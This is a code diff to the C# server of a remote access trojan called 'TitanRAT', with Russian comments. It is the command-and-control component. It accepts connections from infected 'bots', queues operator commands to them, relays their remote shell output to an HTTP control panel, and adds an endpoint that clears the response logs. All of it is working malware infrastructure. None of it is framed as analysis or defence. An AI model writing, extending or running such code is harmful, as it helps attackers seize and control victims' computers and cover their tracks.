@@ -1,4 +1,4 @@
-// Server/Program.cs — исправленная версия с корректной обработкой SHELL_OUT:
+// Server/Program.cs — добавлен DELETE /responses для очистки логов
 using TitanRAT.Server;
 using System.Net;
 using System.Net.Sockets;
@@ -52,10 +52,23 @@ public static class Win32Decompress
     }
 }
 
+// Класс для передачи ответов в панель
+public class ResponseEntry
+{
+    [JsonPropertyName("time")]
+    public string Time { get; set; } = "";
+    [JsonPropertyName("hostname")]
+    public string Hostname { get; set; } = "";
+    [JsonPropertyName("message")]
+    public string Message { get; set; } = "";
+}
+
 class Program
 {
     private static readonly MessageReassembler _reassembler = new();
     private static readonly ConcurrentDictionary<string, ClientSession> _clients = new();
+    private static readonly ConcurrentQueue<ResponseEntry> _responseQueue = new(); // очередь ответов для панели
+    private const int MaxResponseQueue = 500;
     private static volatile bool _running = true;
     private const int TcpPort = 12345;
     private const int HttpPort = 12346;
@@ -63,7 +76,6 @@ class Program
 
     static async Task Main(string[] args)
     {
-        // Регистрация кодовых страниц
         Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
         Console.OutputEncoding = Encoding.UTF8;
 
@@ -112,7 +124,10 @@ class Program
             if (!reg.StartsWith("REGISTER:")) { session.Close(); return; }
             session.Hostname = reg["REGISTER:".Length..];
             _clients[session.Id] = session;
-            Console.WriteLine($"[+] Bot connected: {session.Hostname} ({session.Id})");
+            string connectMsg = $"[+] Bot connected: {session.Hostname} ({session.Id})";
+            Console.WriteLine(connectMsg);
+            AddResponseEntry("system", connectMsg);
+
             await session.SendBinaryAsync(Encoding.UTF8.GetBytes($"ID:{session.Id}"));
 
             while (_running)
@@ -129,7 +144,9 @@ class Program
                     var cmd = session.GetPendingCommand();
                     if (cmd != null)
                     {
-                        Console.WriteLine($"[>] Sending queued command to {session.Id}: {cmd}");
+                        string sendMsg = $"[>] Sending queued command to {session.Id}: {cmd}";
+                        Console.WriteLine(sendMsg);
+                        AddResponseEntry("system", sendMsg);
                         await session.SendBinaryAsync(Encoding.UTF8.GetBytes(cmd));
                     }
                 }
@@ -152,15 +169,19 @@ class Program
                         }
                     }
 
-                    // Обработка shell вывода: строка начинается с SHELL_OUT:
+                    // Обработка shell вывода
                     if (line.StartsWith("SHELL_OUT:"))
                     {
                         string utf8Text = line.Substring(10);
+                        AddResponseEntry(session.Hostname, utf8Text);
                         Console.WriteLine($"[RESPONSE] {session.Id}: {utf8Text}");
                         continue;
                     }
 
-                    // Для остальных сообщений добавляем в историю и реассемблер
+                    // Обычные ответы (pong, MODULE_LOADED_OK и т.п.)
+                    AddResponseEntry(session.Hostname, line);
+                    Console.WriteLine($"[RESPONSE] {session.Id}: {line}");
+
                     session.AddResponse(line);
                     var assembled = _reassembler.Process(session.Id, line);
                     if (assembled != null)
@@ -172,14 +193,30 @@ class Program
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"[!] Error handling {session.Id}: {ex.Message}");
+            string errMsg = $"[!] Error handling {session.Id}: {ex.Message}";
+            Console.WriteLine(errMsg);
+            AddResponseEntry("system", errMsg);
         }
         finally
         {
             _clients.TryRemove(session.Id, out _);
             session.Close();
-            Console.WriteLine($"[-] Bot disconnected: {session.Hostname}");
+            string disconnectMsg = $"[-] Bot disconnected: {session.Hostname}";
+            Console.WriteLine(disconnectMsg);
+            AddResponseEntry("system", disconnectMsg);
         }
+    }
+
+    private static void AddResponseEntry(string hostname, string message)
+    {
+        var entry = new ResponseEntry
+        {
+            Time = DateTime.Now.ToString("HH:mm:ss"),
+            Hostname = hostname,
+            Message = message
+        };
+        _responseQueue.Enqueue(entry);
+        while (_responseQueue.Count > MaxResponseQueue) _responseQueue.TryDequeue(out _);
     }
 
     private static async Task RunHttpApiAsync(CancellationToken token)
@@ -213,6 +250,16 @@ class Program
                 var clients = _clients.Values.Select(c => new { id = c.Id, hostname = c.Hostname, lastSeen = c.LastSeen.ToString("o"), queueSize = c.QueueSize }).ToArray();
                 await SendJsonAsync(response, clients);
             }
+            else if (method == "GET" && path == "/responses")
+            {
+                var responses = _responseQueue.Reverse().ToArray();
+                await SendJsonAsync(response, responses);
+            }
+            else if (method == "DELETE" && path == "/responses")
+            {
+                while (_responseQueue.TryDequeue(out _)) { }
+                await SendJsonAsync(response, new { success = true, message = "All responses cleared" });
+            }
             else if (method == "POST" && path == "/send")
             {
                 using var reader = new StreamReader(request.InputStream, request.ContentEncoding);
@@ -221,6 +268,9 @@ class Program
                 if (payload != null && _clients.TryGetValue(payload.BotId, out var session))
                 {
                     session.EnqueueCommand(payload.Command);
+                    string queueMsg = $"[>] Command queued for {payload.BotId}: {payload.Command}";
+                    Console.WriteLine(queueMsg);
+                    AddResponseEntry("system", queueMsg);
                     await SendJsonAsync(response, new { success = true, message = "Command queued" });
                 }
                 else
